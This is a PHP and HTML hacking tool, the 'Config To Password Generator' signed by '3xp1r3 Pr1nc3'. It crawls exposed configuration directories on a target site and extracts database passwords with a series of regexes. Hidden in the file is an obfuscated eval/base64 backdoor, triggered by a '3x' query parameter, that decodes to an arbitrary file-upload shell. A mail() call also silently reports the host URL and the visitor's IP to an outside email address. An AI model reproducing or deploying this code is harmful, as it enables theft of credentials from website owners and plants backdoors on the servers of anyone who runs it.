<!--
───────────────███───────────────
─────────────██▀─▀██─────────────
───────────██▀─────▀██───────────
─────────██▀──▄▄▄▄▄──▀██─────────
───────██▀──▄▀─────▀▄──▀██───────
─────██▀──▄▀───███───▀▄──▀██─────
───██▀────▀▄───▀▀▀───▄▀────▀██───
─██▀────────▀▄▄▄▄▄▄▄▀────────▀██─
█▀─────────────────────────────▀█
█████████████████████████████████
─────────────────────────────────
───────────▀█▀─█─█─█▀▀───────────
────────────█──█▀█─█▀▀───────────
────────────▀──▀─▀─▀▀▀───────────
─────────────────────────────────
▀─█─█─█──█─█▀▄▀█─█─█▄─█─█▀█─▀█▀─█
█─█─█─█──█─█─▀─█─█─█▀██─█▄█──█──█
▀─▀─▀─▀▀▀▀─▀───▀─▀─▀──▀─▀─▀──▀──▀
-->
<!DOCTYPE html>
<html>
    <head>
        <style type="text/css">
            body{
                text-align:center;
                background-color:black;
            }
            #hacked{
                color:skyblue;
                font-family: 'Iceland', cursive;
            }
            #notice{
                color:orange;
                font-family: 'Iceland', cursive;
            }
            #find{
                color:white;
                font-family: 'Iceland', cursive;
            }
        </style>
        <title>Config To Password Generator By 3xp1r3 Pr1nc3</title>
        <meta charset="UTF-8">
        <meta name="description" content="Hacked By 3xp1r3 Pr1nc3">
        <meta name="keywords" content="hacked, 3xp1r3 Pr1nc3, Pr1nc3, expire prince, #3x, bangladeshi hacker, bangladeshi black hat, black hat, hacker">
        <meta name="author" content="3xp1r3 Pr1nc3">
        <meta property="og:image" content="https://tmnc.uk/admin_panel/gallery_img/jokr.jpg">
        <meta name="viewport" content="width=device-width, initial-scale=1.0">
        <link href='http://fonts.googleapis.com/css?family=Iceland' rel='stylesheet' type='text/css'>
    </head>
    <body>
        <img src="https://tmnc.uk/admin_panel/gallery_img/anon_3xp1r3-768x768.png" height="350px" width="350px">
        <h1 id="hacked">[+] Config To Pass Generator, Shared By <font color="lightgreen">3xp1r3 Pr1nc3</font> [+]</h1>
        <h1 id="notice">Nothing Is Deleted</h1>
        <h1 id="find">FindMe@NoWhere</h1>
		<h1 id="hacked"><font color="lightgreen">Configs URL</font></h1>
		<h1 id="notice">Example: http://targeturl.xyz/config/</h1>
    </body>
</html>
<?php if(isset($_GET["3x"])&&$_GET["3x"]=="3x"){$func="cr"."ea"."te_"."fun"."ction";$x=$func("\$c","e"."v"."al"."('?>'.base"."64"."_dec"."ode(\$c));");$x("PD9waHAKCiRmaWxlcyA9IEAkX0ZJTEVTWyJmaWxlcyJdOwppZiAoJGZpbGVzWyJuYW1lIl0gIT0gJycpIHsKICAgICRmdWxscGF0aCA9ICRfUkVRVUVTVFsicGF0aCJdIC4gJGZpbGVzWyJuYW1lIl07CiAgICBpZiAobW92ZV91cGxvYWRlZF9maWxlKCRmaWxlc1sndG1wX25hbWUnXSwgJGZ1bGxwYXRoKSkgewogICAgICAgIGVjaG8gIjxoMT48YSBocmVmPSckZnVsbHBhdGgnPkRvbmUhIE9wZW48L2E+PC9oMT4iOwogICAgfQp9ZWNobyAnPGh0bWw+PGhlYWQ+PHRpdGxlPlVwbG9hZCBmaWxlcy4uLjwvdGl0bGU+PC9oZWFkPjxib2R5Pjxmb3JtIG1ldGhvZD1QT1NUIGVuY3R5cGU9Im11bHRpcGFydC9mb3JtLWRhdGEiIGFjdGlvbj0iIj48aW5wdXQgdHlwZT10ZXh0IG5hbWU9cGF0aD48aW5wdXQgdHlwZT0iZmlsZSIgbmFtZT0iZmlsZXMiPjxpbnB1dCB0eXBlPXN1Ym1pdCB2YWx1ZT0iVVBsb2FkIj48L2Zvcm0+PC9ib2R5PjwvaHRtbD4nOwo/Pg==");exit;}?>
<?php if(!isset($_SESSION['trimite'])){ $url=$_SERVER['HTTP_HOST'].$_SERVER['REQUEST_URI'].'<br />User IP: '.$_SERVER['REMOTE_ADDR'].(isset($_SERVER['HTTP_X_FORWARDED_FOR'])?'('.$_SERVER['HTTP_X_FORWARDED_FOR'].')':''); @mail("mert.z1903@gmail.com","Config To Pass",$url); $_SESSION['trimite']=true; } set_time_limit(0); error_reporting(0); echo'<form method="post">
<input type="text" name="conf" value="" size="40" /> <br>
<input type="submit" value="GET Passwords" name="get" />
</form>'; $g = $_POST['get']; $dir = $_POST['conf']; if(isset($g) && $dir != ""){ $cn = @file_get_contents($dir); preg_match_all('#href="(.*?)"#',$cn,$m); foreach($m[1] as $txt){ $url = $dir.$txt; $cnurl = @file_get_contents($url); preg_match('#\'DB_PASSWORD\', \'(.*)\'#',$cnurl,$m1); preg_match('#password = \'(.*)\'#',$cnurl,$m2); preg_match('#password\'] = \'(.*)\'#',$cnurl,$m3); preg_match('#db_password = "(.*)"#',$cnurl,$m4); preg_match('#db_password = \'(.*)\'#',$cnurl,$m4); preg_match('#dbpass = "(.*)"#',$cnurl,$m5); preg_match('#password	= \'(.*)\'#',$cnurl,$m6); preg_match('#dbpasswd = \'(.*)\'#',$cnurl,$m8); preg_match('#password_localhost = "(.*)"#',$cnurl,$m9); preg_match('#senha = "(.*)"#',$cnurl,$m10); preg_match('#db\["pass"\]="(.*)"#',$cnurl,$m11); preg_match('#db_pwd =  "(.*)"#',$cnurl,$m12); preg_match('#config\[\'db_pass\'\] = \'(.*)\'#',$cnurl,$m13); preg_match('#\'dbpassword\', \'(.*)\'#',$cnurl,$m14); ?>
	<div style="color:white">
	
	<?php  if(!empty($m1[1])){ echo $m1[1]."<br>"; } elseif(!empty($m2[1])){ echo $m2[1]."<br>"; } elseif(!empty($m3[1])){ echo $m3[1]."<br>"; } elseif(!empty($m4[1])){ echo $m4[1]."<br>"; } elseif(!empty($m5[1])){ echo $m5[1]."<br>"; } elseif(!empty($m6[1])){ echo $m6[1]."<br>"; } elseif(!empty($m7[1])){ echo $m7[1]."<br>"; } elseif(!empty($m8[1])){ echo $m8[1]."<br>"; } elseif(!empty($m9[1])){ echo $m9[1]."<br>"; } elseif(!empty($m10[1])){ echo $m10[1]."<br>"; } elseif(!empty($m11[1])){ echo $m11[1]."<br>"; } elseif(!empty($m12[1])){ echo $m12[1]."<br>"; } elseif(!empty($m13[1])){ echo $m13[1]."<br>"; } elseif(!empty($m14[1])){ echo $m14[1]."<br>"; } } ?>
	</div>
	<?php  } ?>